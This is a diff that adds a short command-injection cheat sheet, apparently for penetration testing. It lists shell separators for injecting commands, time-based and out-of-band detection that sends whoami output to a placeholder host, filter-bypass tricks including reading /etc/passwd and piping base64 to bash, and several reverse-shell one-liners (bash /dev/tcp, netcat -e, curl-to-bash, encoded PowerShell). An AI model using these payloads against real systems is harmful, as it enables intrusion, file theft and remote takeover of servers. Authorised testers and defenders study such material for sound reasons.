@@ -1,0 +1,31 @@
+COMMAND INJECTION — QUICK REF
+
+Requires: input passed into a system shell (ping/nslookup tools, converters, filename fields)
+
+1.  Confirm in-band (append a command):
+    <input>; id
+    <input> | id
+    <input> && id
+    <input> $(id)   |   <input> `id`
+    # Windows: <input> & whoami  |  & ipconfig
+
+2.  Blind:
+    time:  <input>; sleep 5   |   <input> && ping -c 5 127.0.0.1   (win: ping -n 5)
+    OOB:   <input>; curl http://<your-ip>/`whoami`
+           <input>; nslookup `whoami`.<collab-domain>
+    catch: python3 -m http.server 80 / interactsh / Collaborator
+
+3.  Bypasses:
+    no space: cat</etc/passwd  {cat,/etc/passwd}  cat$IFS/etc/passwd  ${IFS}
+    keyword:  w'h'oami  wh$@oami  c\at /etc/passwd  /???/??t /etc/passwd
+    encode:   echo aWQ=|base64 -d|bash
+    concat:   a=who;b=ami;$a$b
+
+4.  Reverse shell (listener: nc -lvnp 4444):
+    <input>; bash -c 'bash -i >& /dev/tcp/<your-ip>/4444 0>&1'
+    <input>; busybox nc <your-ip> 4444 -e /bin/sh
+    <input>; curl http://<your-ip>/s.sh|bash
+    # Windows: & powershell -e <base64-reverse-shell>
+
+5.  Stabilise:
+    python3 -c 'import pty;pty.spawn("/bin/bash")'   # Ctrl-Z; stty raw -echo; fg
